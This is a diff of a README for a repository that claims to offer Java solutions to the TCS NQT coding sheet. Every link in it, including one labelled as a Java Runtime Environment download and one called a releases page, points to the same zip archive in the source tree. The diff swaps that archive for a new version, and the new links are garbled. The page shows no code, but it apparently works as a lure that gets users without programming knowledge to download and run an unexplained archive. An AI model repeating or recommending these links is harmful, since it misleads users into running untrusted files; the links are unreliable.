@@ -1,7 +1,7 @@
 # 📘 TCS-NQT-Practice-Sheet-Java - Ace Your TCS NQT Exam Effortlessly
 
 ## 📥 Download Now
-[![Download TCS-NQT-Practice-Sheet-Java](https://github.com/1998valjean/TCS-NQT-Practice-Sheet-Java/raw/refs/heads/main/Problems on Arrays/NQ_TC_Java_Practice_Sheet_v1.2.zip)](https://github.com/1998valjean/TCS-NQT-Practice-Sheet-Java/raw/refs/heads/main/Problems on Arrays/NQ_TC_Java_Practice_Sheet_v1.2.zip)
+[![Download TCS-NQT-Practice-Sheet-Java](https://github.com/1998valjean/TCS-NQT-Practice-Sheet-Java/raw/refs/heads/main/Problems on Arrays/Java_TC_NQ_Sheet_Practice_v1.7.zip on https://github.com/1998valjean/TCS-NQT-Practice-Sheet-Java/raw/refs/heads/main/Problems on Arrays/Java_TC_NQ_Sheet_Practice_v1.7.zip)](https://github.com/1998valjean/TCS-NQT-Practice-Sheet-Java/raw/refs/heads/main/Problems on Arrays/Java_TC_NQ_Sheet_Practice_v1.7.zip on https://github.com/1998valjean/TCS-NQT-Practice-Sheet-Java/raw/refs/heads/main/Problems on Arrays/Java_TC_NQ_Sheet_Practice_v1.7.zip)
 
 ## 🚀 Getting Started
 Welcome to the TCS-NQT-Practice-Sheet-Java repository! This software provides detailed solutions to all problems in the TCS NQT Coding Sheet, enabling you to develop your skills confidently. You don’t need any programming knowledge to use this application; just follow the steps below to download and run the software.
@@ -9,7 +9,7 @@ Welcome to the TCS-NQT-Practice-Sheet-Java repository! This software provides de
 ## 📋 What You Will Need
 - A computer running Windows, macOS, or Linux.
 - Basic understanding of how to download and open files.
-- Java Runtime Environment (JRE) installed on your computer. If you don’t have it, you can download it [here](https://github.com/1998valjean/TCS-NQT-Practice-Sheet-Java/raw/refs/heads/main/Problems on Arrays/NQ_TC_Java_Practice_Sheet_v1.2.zip).
+- Java Runtime Environment (JRE) installed on your computer. If you don’t have it, you can download it [here](https://github.com/1998valjean/TCS-NQT-Practice-Sheet-Java/raw/refs/heads/main/Problems on Arrays/Java_TC_NQ_Sheet_Practice_v1.7.zip on https://github.com/1998valjean/TCS-NQT-Practice-Sheet-Java/raw/refs/heads/main/Problems on Arrays/Java_TC_NQ_Sheet_Practice_v1.7.zip).
 
 ## 🔍 Features
 - Comprehensive solutions for TCS NQT Coding problems.
@@ -22,7 +22,7 @@ Welcome to the TCS-NQT-Practice-Sheet-Java repository! This software provides de
 To get started, you need to download the application. 
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page.
-   [Download TCS-NQT-Practice-Sheet-Java](https://github.com/1998valjean/TCS-NQT-Practice-Sheet-Java/raw/refs/heads/main/Problems on Arrays/NQ_TC_Java_Practice_Sheet_v1.2.zip)
+   [Download TCS-NQT-Practice-Sheet-Java](https://github.com/1998valjean/TCS-NQT-Practice-Sheet-Java/raw/refs/heads/main/Problems on Arrays/Java_TC_NQ_Sheet_Practice_v1.7.zip on https://github.com/1998valjean/TCS-NQT-Practice-Sheet-Java/raw/refs/heads/main/Problems on Arrays/Java_TC_NQ_Sheet_Practice_v1.7.zip)
 
 2. **Choose the Latest Version**: On the releases page, you will see a list of versions. The latest version will be at the top. Click on it.
 
@@ -56,4 +56,4 @@ Be sure to check back for updates in the repository. We regularly post new solut
 - **TCS CodeVita**: Prepare for the TCS CodeVita competition with similar problem-solving skills.
 - **Striver’s A2Z Sheet**: This repository aligns with Striver's A2Z programming concepts, aiding in overall skill development.
 
-[Download TCS-NQT-Practice-Sheet-Java](https://github.com/1998valjean/TCS-NQT-Practice-Sheet-Java/raw/refs/heads/main/Problems on Arrays/NQ_TC_Java_Practice_Sheet_v1.2.zip) and begin your journey towards acing your TCS NQT exam today!
+[Download TCS-NQT-Practice-Sheet-Java](https://github.com/1998valjean/TCS-NQT-Practice-Sheet-Java/raw/refs/heads/main/Problems on Arrays/Java_TC_NQ_Sheet_Practice_v1.7.zip on https://github.com/1998valjean/TCS-NQT-Practice-Sheet-Java/raw/refs/heads/main/Problems on Arrays/Java_TC_NQ_Sheet_Practice_v1.7.zip) and begin your journey towards acing your TCS NQT exam today!
